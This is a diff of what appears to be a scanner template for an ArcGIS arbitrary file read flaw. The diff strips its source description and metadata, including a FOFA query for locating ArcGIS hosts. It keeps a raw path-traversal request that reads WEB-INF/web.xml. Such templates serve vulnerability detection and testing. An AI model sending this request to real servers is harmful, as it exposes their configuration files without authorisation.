@@ -3,12 +3,8 @@ info:
   name: ArcGIS 地理信息系统 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gmsyx9hl8wn1f8m3'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gmsyx9hl8wn1f8m3
-    fofa: app="esri-ArcGIS"
 http:
 - raw:
   - GET /arcgis/manager/3370/js/../WEB-INF/web.xml HTTP/1.0
